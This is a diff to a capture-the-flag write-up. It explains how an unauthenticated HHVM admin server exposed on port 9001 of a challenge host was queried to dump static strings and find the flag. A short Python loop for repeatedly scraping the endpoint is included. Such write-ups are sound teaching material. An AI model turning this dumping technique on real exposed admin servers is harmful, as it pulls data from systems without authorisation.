@@ -14,7 +14,8 @@ http://34.212.86.199/
 
 ## Solution:
 
-For this problem we found that port 9001 was open. After looking at the webpage we realize that this was HHVM with the [admin server](https://hhvm.com/blog/521/the-adminserver) exposed and unauthenticated. 
+For this problem we found that port 9001 was open. After looking at the webpage we realize that this was HHVM with the [admin server](https://hhvm.com/blog/521/the-adminserver) exposed and unauthenticated.
+
 Looking at the different options available to us on the admin page this section seemed particularly promising:
 ```
 /static-strings:  get number of static strings
@@ -24,4 +25,24 @@ Looking at the different options available to us on the admin page this section 
    count         number of strings to return, default 1
 ```
 
-We can query `http://34.212.86.199/static-strings` to retrieve the number of static strings. Then, we can query `http://34.212.86.199/random-static-strings?count=num` in order to retreive all static strings in the application. The flag can be found with a quick search for `fb{`.
+We can query `http://34.212.86.199:9001/static-strings` to retrieve the number of static strings. 
+
+Then, we can query `http://34.212.86.199:9001/random-static-strings?count=num` in order to retreive all static strings in the application. 
+
+The flag can be found with a quick search for `fb{`.
+
+#### Bonus
+Additionally, we also wrote a dumper in parallel to continous dump strings before we tried `count` parameter on GET request
+
+```python
+import requests
+
+f = open('solve.txt','w')
+for i in xrange(0,1000):
+        r = requests.get("http://34.212.86.199:9001/random-static-strings")
+        f.write(r.text.encode('utf-8').strip())
+```
+
+```
+$ cat solve.txt | grep 'fb{'
+```
